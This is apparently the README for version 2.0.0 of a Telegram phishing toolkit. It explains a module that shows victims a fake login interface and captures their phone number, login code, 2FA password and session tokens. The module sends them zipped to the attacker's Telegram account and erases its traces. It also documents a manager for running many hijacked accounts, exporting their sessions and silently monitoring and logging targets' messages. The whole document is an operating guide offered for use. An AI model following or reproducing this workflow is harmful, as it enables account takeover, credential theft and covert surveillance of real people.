# Telegram Phishing

## **New Version (v2.0.0) - Major Upgrades**

The new version has been completely rewritten with **multi-account support** and **advanced session management**. Here are all the new features and command updates:

---

## **🆕 NEW FEATURES**

### **1. Multi-Account Management**
- **Connect multiple accounts simultaneously** with different aliases
- Switch between accounts instantly with `switch` command
- Execute commands on specific accounts using `:alias` prefix
- View all connected accounts with `accounts` command

### **2. Session Creation & Management**
- `create <session_name> [alias]` - Create new .session file with login
- `create_string [alias] [save_file]` - Generate new String Session
- `export_string [:alias] [save_file]` - Export active account as String Session
- `logout [:alias]` - Fully revoke session (not just disconnect)
- Auto-delete .session file on logout

### **3. SQLite Database Integration**
- Auto-log all received messages to `telegram_manager.db`
- `logs [:alias] [n]` - View recent logged messages
- Persistent storage of message history
- Filter logs by account alias

### **4. Advanced Monitoring**
- `watchall <mode> [target]` - Monitor on EVERY connected account at once
- Per-account monitoring status in `accounts` list
- Automatic handler registration for each account
- Logging includes account identifier

### **5. New Commands**
- `dialogs [:alias] [n]` - List recent chats/dialogs
- `join [:alias] <invite_link|username>` - Join group/channel
- `leave [:alias] <chat>` - Leave group/channel
- `download [:alias] <chat> [message_id]` - Download media files
- `logs [:alias] [n]` - Show message history from database
- `accounts` - List all connected accounts
- `switch <alias>` - Change active account

### **6. Enhanced Error Handling**
- `FloodWaitError` - Automatic handling with wait time display
- `PeerFloodError` - Clear error messages for rate limiting
- `SessionPasswordNeededError` - 2FA support during creation
- RPCError handling with user-friendly messages

### **7. Security Improvements**
- `getpass` module for password input (hidden from terminal)
- Automatic file cleanup on logout
- Session revocation capability
- Better 2FA handling during login flow

### **8. UI Enhancements**
- Display active account in prompt
- Show number of connected accounts
- Per-account monitoring status indicators
- Color-coded command output

---

## **🔴 PHISHING MODULE (`phish/Telegram-Phishing.py`)**

### **Status: Unchanged (Same as v1)**

The phishing module remains **completely untouched** in the new version. No changes have been made to its code. It continues to work exactly as before and is fully compatible with the new `Manager.py`.

### **File Location:**
```
Telegram-Phishing/
├── phish/
│   └── Telegram-Phishing.py    # ← Phishing module (unchanged)
```

### **How It Works:**

1. **Displays fake interface** to the victim
2. **Collects phone number** from victim
3. **Requests verification code** from Telegram
4. **Receives code** from victim
5. **Requests 2FA password** (if enabled)
6. **Creates session** (String Session + .session file)
7. **Compresses files** into a ZIP archive
8. **Sends ZIP** to attacker's channel/user
9. **Auto-cleanup** of temporary files

### **Configuration Required:**

```python
# Line 23 - MUST BE EDITED
YouUsername = "@SpecterOG"  # Change this to YOUR Telegram username
```

### **Captured Information:**

| Data | Description |
|------|-------------|
| Phone Number | Victim's phone with country code |
| Username | @username if available |
| User ID | Numeric Telegram ID |
| String Session | Full session token |
| .session File | Binary session file |
| 2FA Password | If enabled and entered |
| Timestamp | Date and time of capture |

### **Attack Scenarios:**

#### **Scenario 1: Basic Phishing (No 2FA)**
```bash
python phish/Telegram-Phishing.py

# Victim sees:
Phone number (with country code): +1234567890
Enter the code: 12345

# Session captured and sent to your channel
```

#### **Scenario 2: Phishing with 2FA Bypass**
```bash
python phish/Telegram-Phishing.py

# Victim sees:
Phone number (with country code): +1234567890
Enter the code: 12345
Enter 2FA password: MySecretPassword

# Both session AND 2FA password captured
# Caption includes: 2FA Password: MySecretPassword
```

#### **Scenario 3: Silent Operation**
- Screen clears after code entry
- Sent message is automatically deleted
- All local files are removed
- No logs or traces left

---

## **📝 UPDATED COMMANDS**

### **New/Modified Commands**

| Command | New Features |
|---------|-------------|
| `connect` | Now supports alias parameter: `connect session_name [alias]` |
| `string` | Now supports alias parameter: `string <file|token> [alias]` |
| `send` | Now supports alias prefix: `send [:alias] <target> <message>` |
| `send_media` | Now supports alias prefix: `send_media [:alias] <target> <file> [caption]` |
| `monitor` | Now supports alias prefix: `monitor [:alias] <mode> [target]` |
| `stop` | Now supports `:alias` and `all`: `stop [:alias|all]` |
| `info` | Now supports alias: `info [:alias]` |
| `whois` | Now supports alias: `whois [:alias] <username|id|phone>` |
| `disconnect` | Now supports `:alias` and `all`: `disconnect [:alias|all]` |

### **Completely New Commands**

```bash
accounts              # List all connected accounts
switch <alias>        # Change active account
create <session_name> [alias]     # Create new .session with login
create_string [alias] [save_file] # Create new String Session
export_string [:alias] [save_file] # Export existing account as string
logout [:alias]       # Full logout + delete session file
dialogs [:alias] [n]  # List recent chats
join [:alias] <invite_link|username>  # Join group/channel
leave [:alias] <chat> # Leave group/channel
download [:alias] <chat> [message_id] # Download media
logs [:alias] [n]     # View logged messages from database
watchall <mode> [target] # Monitor all accounts at once
```

---

## **❓ Q&A / FAQ**

### **Q1: Can I use my old sessions with the new version?**
**A:** Yes! The new version is fully backward compatible. All your existing `.session` files and String Session files work without any modifications.

### **Q2: What happens if I try to create an account with an existing alias?**
**A:** The system will show an error: `Alias 'name' is already connected. Pick another alias or disconnect it first.`

### **Q3: Does the new version support 2FA?**
**A:** Yes! The `create` and `create_string` commands support 2FA during login. You'll be prompted for the 2FA password if enabled.

### **Q4: How do I monitor all accounts at once?**
**A:** Use the new `watchall` command: `watchall all` - this starts monitoring on every connected account simultaneously.

### **Q5: Where are the logs stored?**
**A:** All messages are automatically saved to `telegram_manager.db` (SQLite database) in the same directory.

### **Q6: What's the difference between `logout` and `disconnect`?**
**A:** 
- `disconnect`: Closes the connection but keeps the session file
- `logout`: Completely revokes the session AND deletes the `.session` file

### **Q7: Can I run commands on a specific account without switching to it?**
**A:** Yes! Use the `:alias` prefix: `send :main @user Hello` sends from the "main" account without switching.

### **Q8: What happens if I try to `stop all` monitoring?**
**A:** It stops monitoring on ALL connected accounts at once. Very useful for mass management.

### **Q9: Can I export my active session as a String Session?**
**A:** Yes! Use `export_string :alias [save_file]` to dump any connected account as a String Session.

### **Q10: Does the new version work with the phishing module?**
**A:** Yes! The phishing module remains unchanged and is fully compatible with both versions.

### **Q11: How many accounts can I connect simultaneously?**
**A:** No theoretical limit! You can connect as many accounts as your system resources allow.

### **Q12: What happens when I type a command without `:alias`?**
**A:** The command runs on the currently active account. Use `switch` to change the active account.

### **Q13: Is there a way to see which account is active?**
**A:** Yes! The prompt shows the active account name, and the `accounts` command shows a `*` next to the active account.

### **Q14: Can I leave a group/channel with this tool?**
**A:** Yes! Use `leave [:alias] <chat>` to leave any group or channel.

### **Q15: How do I download media from a chat?**
**A:** Use `download [:alias] <chat> [message_id]`. If no message_id is provided, it downloads the most recent media from the chat.

### **Q16: What if I get "FloodWaitError"?**
**A:** The tool shows you exactly how many seconds to wait. Example: `Flood wait: Telegram wants you to wait 45s before sending again.`

### **Q17: Are my commands saved?**
**A:** Yes! The `history` command shows your recent commands (last 20).

### **Q18: Can I create a new session without a file name?**
**A:** For `create` you need a session name. For `create_string`, you can use the default alias if you don't specify one.

### **Q19: What's the difference between `.session` and String Session?**
**A:** 
- `.session`: Binary file stored locally
- String Session: Text-based token that can be copied/transferred easily

### **Q20: Is there a way to list my recent chats?**
**A:** Yes! Use `dialogs [:alias] [n]` to list recent chats. Default is 15 chats.

---

## **📖 COMMAND EXAMPLES**

### **Session Management**

```bash
# Connect with alias
connect my_session main
connect work.session work
connect old_account backup

# Use String Session with alias
string my_string.txt temp
string 1AZWarzoBu1K17tzs3XlgeP... secondary

# Create new session with login
create new_account main
create work_account work

# Create String Session
create_string backup_session backup.txt
create_string temp

# Export existing account as string
export_string :main my_string.txt
export_string :work

# Full logout
logout :main
logout :work

# See all available session files
sessions

# See connected accounts
accounts
```

### **Account Switching**

```bash
# Switch active account
switch work
switch main

# Check current active account
# Look at the prompt or use 'accounts'
accounts
```

### **Sending Messages**

```bash
# Send from active account
send @username Hello World!
send 123456789 This is a test

# Send from specific account
send :main @username Hello!
send :work 123456789 Testing

# Send media from active account
send_media @username /path/to/image.jpg "Caption here"
send_media 123456789 /path/to/video.mp4

# Send media from specific account
send_media :main @username /path/to/document.pdf
send_media :work 123456789 /path/to/photo.jpg "Check this out"
```

### **Monitoring**

```bash
# Monitor all messages on active account
monitor all

# Monitor specific user on active account
monitor user @victim
monitor user 123456789

# Monitor specific group/channel
monitor group @groupname
monitor channel @channelname

# Monitor on specific account
monitor :main all
monitor :work user @target

# Monitor ALL connected accounts at once
watchall all
watchall user @target

# Stop monitoring
stop                # Stop on active account
stop :main          # Stop on specific account
stop all            # Stop on ALL accounts
```

### **Information Gathering**

```bash
# Account information
info                # Active account
info :main          # Specific account

# Get entity info
whois @username
whois 123456789
whois :main @username

# List recent chats
dialogs             # Default 15 chats
dialogs 30          # 30 chats
dialogs :main 10    # Specific account

# View command history
history

# View logged messages
logs                # Last 20 messages
logs :main          # Last 20 from main
logs 50             # Last 50 messages
logs :main 30       # Last 30 from main
```

### **Advanced Operations**

```bash
# Join channel/group
join @channelname
join https://t.me/joinchat/abc123
join :main @groupname

# Leave channel/group
leave @channelname
leave :main @groupname
leave 123456789

# Download media
download @chat              # Downloads latest media
download @chat 123          # Downloads specific message
download :main @chat 456    # From specific account

# Clear screen
clear

# Disconnect (keep session)
disconnect          # Active account
disconnect :main    # Specific account
disconnect all      # All accounts

# Exit program
exit
quit
```

### **Complete Workflow Examples**

#### **Example 1: Working with Multiple Accounts**
```bash
# Connect multiple accounts
connect account1.session main
connect account2.session work
connect account3.session backup

# See all accounts
accounts

# Set active account
switch work

# Send message from work
send @contact Hello from work account!

# Send message from main without switching
send :main @friend Hi from main!

# Start monitoring on all accounts
watchall all

# Stop monitoring only main
stop :main

# Check logs
logs :work 20

# Logout backup account
logout :backup
```

#### **Example 2: Session Creation & Export**
```bash
# Create new account session
create new_account myacc

# Create String Session from it
export_string :myacc myacc_string.txt

# Connect with String Session
string myacc_string.txt string_acc

# Check both accounts
accounts

# Switch between them
switch string_acc
switch myacc

# Create another String Session without saving
create_string temp_account

# Export active account
export_string temp_acc.txt
```

#### **Example 3: Monitoring Specific Targets**
```bash
# Connect account
connect main_session main

# Monitor specific user
monitor user @targetuser

# Monitor specific group
monitor group @groupname

# Monitor specific channel
monitor channel @channelname

# Monitor all on specific account
monitor :main all

# Monitor all accounts on specific user
watchall user @targetuser

# Stop all monitoring
stop all
```

#### **Example 4: Advanced Operations**
```bash
# Connect to account
connect session_name main

# Get account info
info

# List recent chats
dialogs 20

# Get info about a user
whois @username

# Send message
send @username "Hello, this is a test message!"

# Join a group
join @groupname

# Leave a group
leave @groupname

# Download media from a chat
download @username

# Check logs
logs 15

# Disconnect
disconnect
```

### **Error Handling Examples**

#### **FloodWaitError Example**
```bash
# When sending too many messages
send @user1 Hello
send @user2 Hello
# Output: [!] Flood wait: Telegram wants you to wait 45s before sending again.
# Wait 45 seconds then continue
```

#### **2FA Login Example**
```bash
# Creating new session with 2FA
create new_account
# Phone number (with country code): +1234567890
# Login code sent by Telegram: 12345
# Two-step verification password: ********
# [+] New session file created & connected!
```

#### **PeerFloodError Example**
```bash
# Too many requests to same user
send @sameuser Message1
send @sameuser Message2
# Output: [!] Peer flood: too many requests to this user/chat recently. Slow down.
```

---

## **⚠️ COMMAND CONFLICTS & REMOVALS**

### **Commands that remain the same:**
- `help` / `?`
- `history`
- `clear`
- `exit` / `quit`

### **Commands with modified behavior:**

| Old Command | New Behavior |
|-------------|--------------|
| `connect session_name` | Now `connect session_name [alias]` - alias optional |
| `string file.txt` | Now `string <file|token> [alias]` - alias optional |
| `monitor all` | Now supports `:alias` prefix and `watchall` for all accounts |
| `stop` | Now supports `stop :alias` or `stop all` |
| `disconnect` | Now supports `disconnect :alias` or `disconnect all` |

---

## **📌 Important Notes**

1. **BACKWARD COMPATIBILITY**: All old commands still work, but now with enhanced features
2. **ALIAS PREFIX**: Use `:alias` before any command to target a specific account
3. **DEFAULT BEHAVIOR**: If no alias specified, command runs on active account
4. **SESSION FILES**: Still compatible with old .session and string files
5. **DATABASE**: New database `telegram_manager.db` automatically created
6. **PHISHING MODULE**: Unchanged - still works the same way

---

## **🚀 Migration Guide for Users**

### From v1.0.0 to v2.0.0:

**Old Way (v1):**
```bash
connect my_session
send @user Hello
monitor all
stop
disconnect
```

**New Way (v2):**
```bash
# Connect multiple accounts
connect my_session main
connect work.session work
string my_string.txt temp

# See all accounts
accounts

# Switch between them
switch work

# Target specific account
send :main @user Hello

# Monitor all accounts at once
watchall all

# Monitor specific account
monitor :main user @target

# Stop all monitoring
stop all

# Logout (delete session)
logout :main

# Create new sessions
create new_account backup
create_string temp_session backup.txt
export_string :backup my_string.txt

# Advanced features
dialogs :main 20
join :main @channelname
download :main @chat 123
logs :main 10
```

---

## **✨ Key Advantages Over v1**

1. **Scalability**: Handle unlimited accounts simultaneously
2. **Persistence**: SQLite database for message history
3. **Flexibility**: Create/export sessions on the fly
4. **Control**: Per-account monitoring and management
5. **Security**: Better 2FA handling and logout capabilities
6. **Usability**: Better UI with account indicators
7. **Reliability**: Flood/Peer error handling
8. **Automation**: Watchall for mass monitoring
